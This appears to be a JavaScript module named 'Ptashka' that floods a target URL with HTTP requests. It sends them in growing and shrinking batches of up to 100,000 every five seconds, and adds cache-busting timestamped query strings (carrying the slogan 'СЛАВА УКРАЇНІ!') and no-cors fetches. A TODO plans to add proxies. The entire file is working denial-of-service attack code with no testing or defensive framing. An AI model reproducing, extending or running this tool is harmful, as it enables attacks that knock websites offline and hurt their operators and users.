import { setCustomInterval } from '../helpers.js';

/*
-- FLOW --
-- a. Start sending requests starting from 1 to 1000 per 5 seconds
-- b. Start increasing the outgoing requests batch size until it reaches a breakpoint
-- c. Once the breakpoint is reached, start decreasing the outgoing requests batch size 
----- until it reaches a lower breakpoint
*/

// CONSTANTS
const STATUS_READY = 'READY';
const STATUS_RUNNING = 'RUNNING';
const STATUS_PAUSED = 'PAUSED';

const INTERVAL_PERIOD = 5000; // 5 sec

// depending on the batch resize direction, increase or decrease
// the batch size by multiplying the breakpoint by the factor
const BATCH_STEP_FACTOR = 0.5;
// maximum batch size
const BATCH_SIZE_LIMIT = 100000;
// if the direction is 1, then the batch size is growing
// else if the direction is -1, then the batch size is shrinking
const BATCH_SIZE_DIRECTION_GROW = 1;
const BATCH_SIZE_DIRECTION_SHRINK = -1;
// if the batch size is shrinking, then it should grow, hence
// the next breakpoint will be increased by the growth factor
// and vice versa
const BATCH_SIZE_DIRECTION_GROW_FACTOR = 4;
const BATCH_SIZE_DIRECTION_SHRINK_FACTOR = 0.5;

// TODO: Retrieve the Content-Length
// TODO: Find proxies

class Ptashka extends EventTarget {
  constructor(url) {
    super();

    this.url = url;
  }

  url = '';
  status = STATUS_READY;
  sent = 0;
  interval = null;
  startedAt = new Date().toISOString();
  pausedAt = null;

  batchSizeDirection = BATCH_SIZE_DIRECTION_GROW;
  batchSizeBreakpoint = 64;
  batchSize = 1; // number of ptashka to send at the interval

  controller = new AbortController();

  static async send(url) {
    const instance = new Ptashka(url);

    return instance.send();
  }

  async send() {
    if (this.isStatusRunning) {
      console.error(`The Ptashka is already working on ${this.url}.`);

      return;
    }

    this.#setStatusRunning();

    const sendRequests = async () => {
      let batch = [];

      let counter = 0;
      for (counter; counter < this.batchSize; counter += 1) {
        const request = this.#createRequest();

        batch.push(request);
      }

      const responses = await Promise.allSettled(
        batch.map(async (request) => {
          const response = await fetch(request);

          return response;
        })
      );

      const isRequestAborted = responses.some(
        (response) => response.reason.name === 'AbortError'
      );
      if (isRequestAborted) {
        return this;
      }

      this.#setSent(this.sent + this.batchSize);

      console.log('RESPONSES', responses);

      const isBreakpointReached = this.#isBatchSizeDirectionIncreasing
        ? this.batchSize >= this.batchSizeBreakpoint
        : this.batchSize <= this.batchSizeBreakpoint;

      // if the breakpoint is reached
      if (isBreakpointReached) {
        // set a default breakpoint
        let nextBreakpoint = BATCH_SIZE_LIMIT;

        // then check whether the batch size is rising or falling
        switch (this.batchSizeDirection) {
          // if the batch size is rising
          case BATCH_SIZE_DIRECTION_GROW: {
            // then decrease the next breakpoint by multiplying by the fall factor
            nextBreakpoint =
              this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_SHRINK_FACTOR;

            break;
          }

          // if the batch size is falling
          case BATCH_SIZE_DIRECTION_SHRINK: {
            // then increase the next breakpoint by multiplying by the rise factor
            nextBreakpoint =
              this.batchSizeBreakpoint * BATCH_SIZE_DIRECTION_GROW_FACTOR;

            // and check whether the next batch size breakpoint is not higher than a limit
            const isLimitReached = nextBreakpoint > BATCH_SIZE_LIMIT;

            // if the next batch size breakpoint is higher than a limit
            if (isLimitReached) {
              // then limit the next batch size
              nextBreakpoint = BATCH_SIZE_LIMIT;
            }

            break;
          }
        }

        this.#reverseDirection();

        this.batchSizeBreakpoint = nextBreakpoint;
      }

      // TODO: refactor as a separate function
      this.batchSize +=
        this.batchSizeDirection *
        (this.batchSizeBreakpoint * BATCH_STEP_FACTOR);
    };

    // TODO: use setTimeout if successful, otherwise retry 5 times and abort

    this.interval = setCustomInterval(sendRequests, INTERVAL_PERIOD, true);

    return this;
  }

  async pause() {
    if (!this.isStatusRunning) {
      console.error(`The Ptashka is not working on ${this.url} yet.`);

      return;
    }

    this.#setStatusPaused();

    // abort the fetch requests
    this.controller.abort();

    this.#resetInterval();
  }

  async resume() {
    if (!this.isStatusPaused) {
      console.error(`The Ptashka working on ${this.url} is not paused yet.`);

      return;
    }

    await this.send();
  }

  #dispatchChange(change) {
    const event = new CustomEvent('change', { detail: change });

    this.dispatchEvent(event);

    const isOnChangeDefined = this.onchange !== undefined;
    if (isOnChangeDefined) {
      this.onchange(change);
    }
  }

  #watchPropChange(prop, setter) {
    return (value) => {
      const change = {
        key: prop,
        value,
      };

      const result = setter(value);

      this.#dispatchChange(change);

      return result;
    };
  }

  toJSON() {
    const serialized = {
      url: this.url,
      sent: this.sent,
      status: this.status,
      startedAt: this.startedAt,
      pausedAt: this.pausedAt,
      batchSizeDirection: this.batchSizeDirection,
      batchSizeBreakpoint: this.batchSizeBreakpoint,
      batchSize: this.batchSize,
    };

    return serialized;
  }

  // GETTERS
  get isStatusRunning() {
    return this.status === STATUS_RUNNING;
  }

  get isStatusPaused() {
    return this.status === STATUS_PAUSED;
  }

  get #isBatchSizeDirectionIncreasing() {
    return this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW;
  }

  // SETTERS
  #setStatus = this.#watchPropChange('status', (value) => {
    const currentDateISO = new Date().toISOString();

    this.status = value;

    if (this.isStatusPaused) {
      this.#setPausedAt(currentDateISO);
    }
  });

  #setStatusRunning() {
    this.#setStatus(STATUS_RUNNING);
  }

  #setStatusPaused() {
    this.#setStatus(STATUS_PAUSED);
  }

  #setSent = this.#watchPropChange('sent', (value) => {
    this.sent = value;
  });

  #setStartedAt = this.#watchPropChange('startedAt', (value) => {
    this.startedAt = value;
  });

  #setPausedAt = this.#watchPropChange('pausedAt', (value) => {
    this.pausedAt = value;
  });

  #setInterval(value) {
    this.interval = value;
  }

  // HELPERS
  #reverseDirection() {
    this.batchSizeDirection =
      this.batchSizeDirection === BATCH_SIZE_DIRECTION_GROW
        ? BATCH_SIZE_DIRECTION_SHRINK
        : BATCH_SIZE_DIRECTION_GROW;
  }

  #createRequest() {
    const requestOptions = {
      mode: 'no-cors',
      credentials: 'include',
      cache: 'no-cache',
      headers: {
        Authorization:
          'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
      },
      signal: this.controller.signal,
    };

    const searchParamsKey = Date.now();
    const searchParamsValue = `СЛАВА УКРАЇНІ! ${Date.now()}`;

    const requestUrl = new URL(this.url);

    requestUrl.searchParams.append(searchParamsKey, searchParamsValue);

    const request = new Request(requestUrl, requestOptions);

    return request;
  }

  #resetInterval() {
    clearInterval(this.interval);

    this.#setInterval(null);
  }
}

export default Ptashka;
